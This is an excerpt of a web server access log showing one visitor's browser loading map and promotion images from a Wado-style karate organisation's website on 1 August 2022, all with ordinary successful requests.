::ffff:73.170.237.58 - - [01/Aug/2022:09:50:00 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:00 +0000] "GET /images/promotions/20220728corpuz.jpg HTTP/1.1" 200 108218 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:00 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:00 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:00 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:00 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:01 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:01 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:01 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:01 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:01 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:73.170.237.58 - - [01/Aug/2022:09:50:01 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://www.wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
